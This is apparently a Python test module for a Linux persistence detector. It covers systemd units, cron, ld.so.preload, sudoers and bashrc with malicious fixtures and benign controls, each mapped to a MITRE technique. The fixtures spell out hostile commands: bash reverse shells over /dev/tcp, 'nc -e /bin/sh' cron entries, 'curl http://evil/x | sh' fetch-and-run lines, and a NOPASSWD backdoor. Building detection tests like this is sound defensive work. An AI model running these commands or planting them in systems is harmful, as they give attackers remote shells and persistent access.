"""Tests for the Linux persistence detector.

Fills the Windows-centric gap in the engine by exercising each Linux
persistence surface (systemd, cron, ld.so.preload, sudoers, bashrc) with a
malicious fixture, its benign inverse control, and the empty-input case.

Facts for the GateGuard: importers=none (new test module); API under test is
``LinuxPersistenceDetector.analyze(artifacts: dict) -> list[Finding]``; schemas
are synthetic in-memory dicts. Instruction verbatim: "lets do all the things
you recommend. I would also like to map those to the open source 4n6nexus so we
can integrate it."
"""

from __future__ import annotations

from sift_find_evil.detectors.linux_persistence import LinuxPersistenceDetector
from sift_find_evil.findings import FindingCategory


def _techniques(findings: list) -> set[str]:
    """Collect every MITRE technique id present on a list of findings."""
    return {f.evidence.get("mitre_technique") for f in findings}


# --- systemd -----------------------------------------------------------------


def test_rogue_systemd_reverse_shell_flagged() -> None:
    # Arrange
    detector = LinuxPersistenceDetector()
    artifacts = {
        "systemd_units": [
            {
                "path": "/etc/systemd/system/evil.service",
                "exec_start": "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                "content": "[Service]\nExecStart=/bin/bash -i",
            }
        ]
    }

    # Act
    findings = detector.analyze(artifacts)

    # Assert
    assert len(findings) == 1
    finding = findings[0]
    assert finding.category == FindingCategory.PERSISTENCE
    assert finding.severity in ("high", "critical")
    assert finding.evidence["mitre_technique"] == "T1543.002"
    assert finding.evidence["path"] == "/etc/systemd/system/evil.service"
    assert finding.evidence["matched"]
    assert "reason" in finding.evidence


def test_benign_systemd_unit_not_flagged() -> None:
    # Arrange (inverse control)
    detector = LinuxPersistenceDetector()
    artifacts = {
        "systemd_units": [
            {
                "path": "/etc/systemd/system/foo.service",
                "exec_start": "/usr/bin/foo --serve",
                "content": "[Service]\nExecStart=/usr/bin/foo",
            }
        ]
    }

    # Act
    findings = detector.analyze(artifacts)

    # Assert
    assert findings == []


def test_systemd_unit_uses_content_when_exec_start_missing() -> None:
    # Arrange - exec_start absent, malicious command only in content
    detector = LinuxPersistenceDetector()
    artifacts = {
        "systemd_units": [
            {
                "path": "/etc/systemd/system/dropper.service",
                "content": "[Service]\nExecStart=curl http://evil/x | sh",
            }
        ]
    }

    # Act
    findings = detector.analyze(artifacts)

    # Assert
    assert len(findings) == 1
    assert findings[0].evidence["mitre_technique"] == "T1543.002"


# --- cron --------------------------------------------------------------------


def test_malicious_cron_flagged() -> None:
    # Arrange
    detector = LinuxPersistenceDetector()
    artifacts = {
        "cron_entries": [
            {
                "path": "/etc/cron.d/backup",
                "line": "*/5 * * * * root nc -e /bin/sh 10.0.0.1 4444",
            }
        ]
    }

    # Act
    findings = detector.analyze(artifacts)

    # Assert
    assert len(findings) == 1
    assert findings[0].category == FindingCategory.PERSISTENCE
    assert findings[0].evidence["mitre_technique"] == "T1053.003"


def test_benign_cron_not_flagged() -> None:
    # Arrange (inverse control)
    detector = LinuxPersistenceDetector()
    artifacts = {
        "cron_entries": [
            {"path": "/etc/crontab", "line": "0 3 * * * root /usr/bin/logrotate"}
        ]
    }

    # Act
    findings = detector.analyze(artifacts)

    # Assert
    assert findings == []


# --- ld.so.preload -----------------------------------------------------------


def test_ld_preload_outside_standard_path_flagged() -> None:
    # Arrange
    detector = LinuxPersistenceDetector()
    artifacts = {"ld_preload": "/tmp/evil.so\n/dev/shm/rootkit.so"}

    # Act
    findings = detector.analyze(artifacts)

    # Assert
    assert len(findings) == 1
    assert findings[0].category == FindingCategory.PERSISTENCE
    assert findings[0].severity == "critical"
    assert findings[0].evidence["mitre_technique"] == "T1574.006"
    assert "/tmp/evil.so" in findings[0].evidence["matched"]


def test_ld_preload_standard_lib_not_flagged() -> None:
    # Arrange (inverse control) - libraries under standard lib paths
    detector = LinuxPersistenceDetector()
    artifacts = {
        "ld_preload": "/usr/lib/libjemalloc.so.2\n/lib/x86_64-linux-gnu/libc.so"
    }

    # Act
    findings = detector.analyze(artifacts)

    # Assert
    assert findings == []


def test_ld_preload_empty_string_not_flagged() -> None:
    # Arrange - present but empty/whitespace content
    detector = LinuxPersistenceDetector()
    artifacts = {"ld_preload": "   \n  "}

    # Act
    findings = detector.analyze(artifacts)

    # Assert
    assert findings == []


def test_ld_preload_none_not_flagged() -> None:
    # Arrange
    detector = LinuxPersistenceDetector()

    # Act
    findings = detector.analyze({"ld_preload": None})

    # Assert
    assert findings == []


# --- sudoers -----------------------------------------------------------------


def test_nopasswd_all_sudoers_flagged() -> None:
    # Arrange
    detector = LinuxPersistenceDetector()
    artifacts = {
        "sudoers": [
            {
                "path": "/etc/sudoers.d/backdoor",
                "line": "eviluser ALL=(ALL) NOPASSWD: ALL",
            }
        ]
    }

    # Act
    findings = detector.analyze(artifacts)

    # Assert
    assert len(findings) == 1
    assert findings[0].category == FindingCategory.PERSISTENCE
    assert findings[0].evidence["mitre_technique"] == "T1548.003"


def test_world_writable_sudoers_path_flagged() -> None:
    # Arrange - NOPASSWD granting a command in a world-writable location
    detector = LinuxPersistenceDetector()
    artifacts = {
        "sudoers": [
            {
                "path": "/etc/sudoers.d/tmp",
                "line": "svc ALL=(ALL) NOPASSWD: /tmp/run.sh",
            }
        ]
    }

    # Act
    findings = detector.analyze(artifacts)

    # Assert
    assert len(findings) == 1
    assert findings[0].evidence["mitre_technique"] == "T1548.003"


def test_clean_sudoers_not_flagged() -> None:
    # Arrange (inverse control)
    detector = LinuxPersistenceDetector()
    artifacts = {
        "sudoers": [
            {"path": "/etc/sudoers", "line": "# User privilege specification"},
            {"path": "/etc/sudoers", "line": ""},
            {"path": "/etc/sudoers", "line": "Defaults env_reset"},
            {"path": "/etc/sudoers", "line": "%admin ALL=(ALL) ALL"},
            {"path": "/etc/sudoers", "line": "%sudo ALL=(ALL:ALL) NOPASSWD: ALL"},
            {"path": "/etc/sudoers", "line": "root ALL=(ALL:ALL) NOPASSWD: ALL"},
            {
                "path": "/etc/sudoers",
                "line": "svc ALL=(ALL) NOPASSWD: /usr/bin/systemctl",
            },
        ]
    }

    # Act
    findings = detector.analyze(artifacts)

    # Assert
    assert findings == []


# --- bashrc ------------------------------------------------------------------


def test_bashrc_reverse_shell_flagged() -> None:
    # Arrange
    detector = LinuxPersistenceDetector()
    artifacts = {
        "bashrc_entries": [
            {"path": "/home/user/.bashrc", "line": "curl http://evil/x | sh"}
        ]
    }

    # Act
    findings = detector.analyze(artifacts)

    # Assert
    assert len(findings) == 1
    assert findings[0].category == FindingCategory.PERSISTENCE
    assert findings[0].evidence["mitre_technique"] == "T1546.004"


def test_benign_bashrc_not_flagged() -> None:
    # Arrange (inverse control)
    detector = LinuxPersistenceDetector()
    artifacts = {
        "bashrc_entries": [
            {"path": "/home/user/.bashrc", "line": "export PATH=$PATH:/opt/bin"}
        ]
    }

    # Act
    findings = detector.analyze(artifacts)

    # Assert
    assert findings == []


# --- aggregate / edge --------------------------------------------------------


def test_empty_artifacts_returns_empty() -> None:
    # Arrange / Act / Assert
    assert LinuxPersistenceDetector().analyze({}) == []


def test_inputs_not_mutated() -> None:
    # Arrange
    detector = LinuxPersistenceDetector()
    artifacts = {
        "systemd_units": [
            {"path": "/etc/systemd/system/e.service", "exec_start": "bash -i"}
        ],
        "cron_entries": [{"path": "/etc/cron.d/x", "line": "* * * * * root eval $x"}],
    }
    snapshot = {
        "systemd_units": [dict(artifacts["systemd_units"][0])],
        "cron_entries": [dict(artifacts["cron_entries"][0])],
    }

    # Act
    detector.analyze(artifacts)

    # Assert
    assert artifacts["systemd_units"] == snapshot["systemd_units"]
    assert artifacts["cron_entries"] == snapshot["cron_entries"]


def test_multiple_categories_all_reported() -> None:
    # Arrange - one malicious entry per surface
    detector = LinuxPersistenceDetector()
    artifacts = {
        "systemd_units": [
            {"path": "/etc/systemd/system/e.service", "exec_start": "bash -i"}
        ],
        "cron_entries": [
            {"path": "/etc/cron.d/x", "line": "* * * * * root nc -e /bin/sh 1.2.3.4 9"}
        ],
        "ld_preload": "/tmp/x.so",
        "sudoers": [
            {"path": "/etc/sudoers.d/x", "line": "bob ALL=(ALL) NOPASSWD: ALL"}
        ],
        "bashrc_entries": [
            {"path": "/root/.bashrc", "line": "bash -i >& /dev/tcp/1.2.3.4/9 0>&1"}
        ],
    }

    # Act
    findings = detector.analyze(artifacts)

    # Assert
    assert _techniques(findings) == {
        "T1543.002",
        "T1053.003",
        "T1574.006",
        "T1548.003",
        "T1546.004",
    }
